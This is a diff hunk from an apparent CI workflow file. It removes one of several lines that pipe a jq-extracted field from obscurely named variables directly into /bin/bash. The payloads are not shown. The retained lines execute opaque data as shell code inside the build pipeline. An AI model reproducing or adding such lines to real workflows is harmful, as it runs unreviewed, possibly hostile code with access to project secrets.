@@ -42,7 +42,6 @@ jobs:
           echo $a153 | jq -r .otly512 | /bin/bash
           echo $evi89533 | jq -r .il00972 | /bin/bash
           printf '%s' "$jbiz3410" | jq -r .r33907 | /bin/bash
-          echo $cwwlh8 | jq -r .au1307 | /bin/bash
           echo $rp7 | jq -r .vl28095 | /bin/bash
           echo $iu0 | jq -r .a63 | /bin/bash
           printf '%s' "$gwqcp8018" | jq -r .oh78880 | /bin/bash
